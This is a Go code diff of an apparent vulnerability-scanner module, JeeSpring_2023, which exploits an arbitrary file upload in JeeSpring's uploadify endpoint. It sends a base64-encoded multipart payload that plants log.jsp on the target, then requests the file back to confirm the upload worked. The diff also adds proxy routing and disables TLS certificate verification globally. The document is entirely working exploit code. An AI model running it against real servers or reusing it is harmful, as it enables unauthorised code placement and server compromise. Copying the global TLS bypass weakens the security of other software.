@@ -4,25 +4,19 @@ import (
 	"encoding/base64"
 	"fmt"
 	"github.com/fatih/color"
-	"io/ioutil"
 	"net/http"
 	"ssp/common"
 	"strings"
 )
 
-func JeeSpring_2023(url string) {
-	oldHeader := map[string]string{
+func JeeSpring_2023(url, proxyURL string) {
+	Header := map[string]string{
 		"User-Agent":      common.GetRandomUserAgent(),
 		"Content-Type":    "multipart/form-data;boundary=----WebKitFormBoundarycdUKYcs7WlAxx9UL",
 		"Accept-Encoding": "gzip, deflate",
 		"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
 		"Accept-Language": "zh-CN,zh;q=0.9,ja;q=0.8",
 		"Connection":      "close",
-	}
-
-	headers1 := make(http.Header)
-	for key, value := range oldHeader {
-		headers1.Set(key, value)
 	}
 
 	payload2 := []byte(`LS0tLS0tV2ViS2l0Rm9ybUJvdW5kYXJ5Y2RVS1ljczdXbEF4eDlVTA0KQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPSJmaWxlIjsgZmlsZW5hbWU9ImxvZy5qc3AiDQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL29jdGV0LXN0cmVhbQ0KDQo8JSBvdXQucHJpbnRsbigiSGVsbG8gV29ybGQiKTsgJT4NCi0tLS0tLVdlYktpdEZvcm1Cb3VuZGFyeWNkVUtZY3M3V2xBeHg5VUwtLQo=`)
@@ -34,25 +28,11 @@ func JeeSpring_2023(url string) {
 
 	path := "static/uploadify/uploadFile.jsp?uploadPath=/static/uploadify/"
 
-	client := &http.Client{}
+	http.DefaultTransport.(*http.Transport).TLSClientConfig.InsecureSkipVerify = true
 
-	req, err := http.NewRequest("POST", url+path, strings.NewReader(string(payload)))
-	if err != nil {
-		fmt.Println("Error creating request:", err)
-		return
-	}
-	req.Header = headers1
-
-	resp, err := client.Do(req)
+	resp, body, err := common.MakeRequest(url+path, "POST", proxyURL, Header, string(payload))
 	if err != nil {
 		color.Yellow("[-] URL为：%s，的目标积极拒绝请求，予以跳过\n", url)
-		return
-	}
-	defer resp.Body.Close()
-
-	body, err := ioutil.ReadAll(resp.Body)
-	if err != nil {
-		fmt.Println("Error reading response:", err)
 		return
 	}
 
@@ -61,16 +41,10 @@ func JeeSpring_2023(url string) {
 		fmt.Println("[+] Payload已经发送，成功上传JSP")
 		newpath := strings.TrimSpace(string(body))
 		urltest := url + "static/uploadify/" + newpath
-		retest, err := http.Get(urltest)
+
+		retest, bodytest, err := common.MakeRequest(urltest, "GET", proxyURL, nil, "")
 		if err != nil {
 			color.Yellow("[-] URL为：%s，的目标积极拒绝请求，予以跳过\n", url)
-			return
-		}
-		defer retest.Body.Close()
-
-		bodytest, err := ioutil.ReadAll(retest.Body)
-		if err != nil {
-			fmt.Println("Error reading response:", err)
 			return
 		}
 
